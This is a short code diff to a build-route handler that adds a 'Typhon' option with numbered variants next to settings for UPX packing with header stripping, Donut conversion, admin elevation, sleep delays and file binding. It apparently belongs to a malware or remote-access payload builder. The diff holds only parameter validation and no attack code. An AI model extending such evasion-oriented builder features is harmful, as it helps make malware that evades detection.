@@ -66,6 +66,8 @@ export async function handleBuildRoutes(
         enableUpx,
         upxStripHeaders,
         enableDonut,
+        enableTyphon,
+        typhonVariant,
         requireAdmin,
         outputExtension,
         sleepSeconds,
@@ -166,6 +168,11 @@ export async function handleBuildRoutes(
       const safeSleepSeconds =
         typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
           ? sleepSeconds : 0;
+      const VALID_TYPHON_VARIANTS = new Set(["1", "2", "3", "4", "5", "6", "7", "8", "all", "safe", "rec"]);
+      const safeTyphonVariant =
+        typeof typhonVariant === "string" && VALID_TYPHON_VARIANTS.has(typhonVariant.trim().toLowerCase())
+          ? typhonVariant.trim().toLowerCase()
+          : "1";
 
       const MAX_BOUND_FILES = 5;
       const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
@@ -243,6 +250,8 @@ export async function handleBuildRoutes(
         enableUpx: !!enableUpx,
         upxStripHeaders: !!upxStripHeaders,
         enableDonut: !!enableDonut,
+        enableTyphon: !!enableTyphon,
+        typhonVariant: !!enableTyphon ? safeTyphonVariant : undefined,
         requireAdmin: safeRequireAdmin,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
